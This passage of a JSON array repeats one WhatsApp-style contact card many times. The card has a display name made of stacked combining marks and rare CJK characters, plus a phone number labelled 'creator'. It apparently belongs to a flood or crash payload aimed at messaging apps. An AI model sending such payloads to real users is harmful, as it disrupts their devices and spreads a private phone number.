								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
